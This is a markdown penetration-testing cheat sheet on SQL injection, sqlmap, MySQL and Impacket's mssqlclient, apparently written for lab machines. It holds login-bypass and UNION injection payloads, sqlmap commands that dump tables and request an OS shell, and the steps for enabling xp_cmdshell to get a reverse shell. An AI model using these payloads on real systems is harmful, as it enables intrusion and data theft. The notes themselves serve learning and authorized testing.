- [SQL Injection](#sqli)
- [MYSQL](#mysql)
- [mssqlclient.py](#msspy)

# SQL INJECTION <a name="sqli"></a>
*MySQL SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
*Oracle SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
*PostgreSQL SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
## Classic SQL Injection
This is the most common type of SQL injection, where an attacker injects malicious SQL code into an application's input fields, typically through user inputs like forms or URL parameters.

```bash
' OR '1'='1
```
If the application does not properly sanitize input, the SQL query might look like this:
```bash
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
```

Also, you can use **#** . The **#** character is used for commenting. So, if the line responsible for the login is: 
````bash
SELECT * FROM users WHERE user=\$user AND password=\$password
```` 
When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9' AND password=$123
````
 If we input:
 ````bash
 user=Kill-9'#'
````
The statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9'# AND password=$123
```` 
The commented part is not processed, granting us access.


## Union-Based SQL Injection
In a union-based SQL injection, the attacker leverages the UNION SQL operator to combine results from the original query with results from their injected query.
An attacker might inject SQL code like this:
```bash
' UNION SELECT null, username, password FROM users --
```

## Determine the number of columns
If we have an injectable parameter and we want to know how many columns does the database have, we can execute:
```bash
' order+by+<number>--
```
When it causes a *500* response that means that there are not "number" columns
## SQLmap
SQLmap is an open-source tool used in penetration testing to detect and exploit SQL  injection flaws. SQLmap automates the process of detecting and exploiting SQL  injection. SQL Injection attacks can take control of databases that utilize SQL.

If we needed authentication to access to the web we will need to add the cookies value to the command. For doing that we can use Cookie-Editor, explained in [[Useful webs]].
- **EXAMPLE 1**
	- Parameters:
		- `-u`: Specifies the target URL to be tested for SQL injection vulnerabilities. In this case, the target URL is `http://10.129.95.174/dashboard.php?search=any+query`
	    
		- `--cookie`: Sets the cookie value for the HTTP request. Cookies are often used to maintain session information. Here, the cookie being set is `PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1`.
	    
		- `--os-shell`: This parameter instructs SQLMap to attempt to obtain an operating system shell on the vulnerable server if it successfully exploits a SQL injection vulnerability. An operating system shell allows direct interaction with the underlying operating system.
	```bash
	sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --  
	cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
	```
- **EXAMPLE 2**
	- If we discover that a page is vulnerable to SQL injection, _sqlmap_ can be very helpful. To be able to execute these commands, we need to have previously saved a request with _save item_ in Burp Suite, assuming that the file where we saved it is called **pc**. The field in which the insertion will be made in this example is **id**, previously investigated in Burp Suite.

	- *Parameters:*
		- `-r pc`: This parameter specifies the file that contains the saved HTTP request, in this case called "pc". The file is used as input for sqlmap and contains the request that will be used to perform the SQL injection test.
		- `-p id`: This parameter indicates the name of the URL parameter or body parameter in the HTTP request that will be used as the SQL injection point. In this case, the parameter is named "id" and sqlmap will attempt to inject SQL into that parameter to search for possible vulnerabilities.
		- `--dbs`: This parameter instructs sqlmap to enumerate the available databases on the database server. By specifying this parameter, sqlmap will search for information about the databases it has access to by injecting SQL into the mentioned parameter.
		- `--tables`: This parameter instructs sqlmap to enumerate the available tables in the selected database. By using this parameter, sqlmap will search for information about the tables present in the database through the injection of SQL into the mentioned parameter.
		- `-D SQLite_masterdb`: This parameter specifies the name of the database on which the operations will be performed. In this case, "SQLite_masterdb" is used as the database name.
		- `-T accounts`: This parameter specifies the name of the table on which the operations will be performed. In this case, "accounts" is used as the table name.
		- `--columns`: This parameter instructs sqlmap to enumerate the available columns in the specified table.
		- `--batch`: This parameter is used to run sqlmap in batch mode, which means it will not prompt for any interactive user input and will perform the operations automatically.
		- `--threads 5`: This parameter specifies the number of threads that sqlmap will use simultaneously to perform the operations. In this case, 5 threads are used.
		- `--dump`: This parameter instructs sqlmap to extract the data from the specified table and display it as output.

	- *Commands: *
		- It shows the backend database is SQLite. 
		```bash
		sqlmap -r pc -p id 
		sqlmap -r pc -p id --dbs 
		sqlmap -r pc -p id --tables  
		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns 
		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump
		```
- **Exemple 3**
	- As in the first example we can use *sqlmap* with an specified target to extract the database information withput using cookies:
	- *Parameters*:
		- `-u`: Specifies the target URL to be tested for SQL injection vulnerabilities. In this case, the target URL is `http://192.168.1.102/administrator`
	    
		- `--batch`: This parameter is used to run sqlmap in batch mode, which means it will not prompt for any interactive user input and will perform the operations automatically.
	    
		- `--dbs`: This parameter instructs sqlmap to enumerate the available databases on the database server. By specifying this parameter, sqlmap will search for information about the databases it has access to by injecting SQL into the mentioned parameter.

		- `--tables`: This parameter instructs sqlmap to enumerate the available tables in the selected database. By using this parameter, sqlmap will search for information about the tables present in the database through the injection of SQL into the mentioned parameter.
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms --dbs --batch
	```
	After using this command the available databases will be printed, then you can enumerate  the tales stored in each database:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> --tables --batch
	```
	Once you have introduced this command the available columns in the database will be printed. Now to find the content of the columns you need to use the following command:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> --columns --batch
	```
	Finally, you can print the columns information using:
	```bash
	sqlmap -u http://192.168.1.102/administrator --forms -D <database_name> -T <Columns_name> -C <parameter1>,<parameter2><parameter3> --dump --batch
	```

 

# MySQL <a name="mysql"></a>

Commands:

````bash
SHOW databases;
````  
- Prints out the databases we can access.
````bash
USE {database_name};
````  
- Set to use the database named {database_name}.
````bash
SHOW tables;
````  
- Prints out the available tables inside the current database.
````bash
SELECT * FROM {table_name};
````  
- Prints out all the data from the table {table_name}.

To connect:
````bash
mysql -h 10.129.42.201 -u root
````


# mssqlclient.py <a name="msspy"></a>
mssqlclient.py is a script from the Impacket class collection. When mssqlclient.py is executed, a connection is established with the specified SQL Server and it allows interaction through a command-line interface.

- `windows-auth`: This flag is specified to use Windows Authentication.
- `ARCHETYPE/sql_svc`: Server ID (previously found).
````bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
````

In case `xp_cmdshell` is not enabled (which is the command we will use for a reverse shell), perform the following steps:
````bash
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

````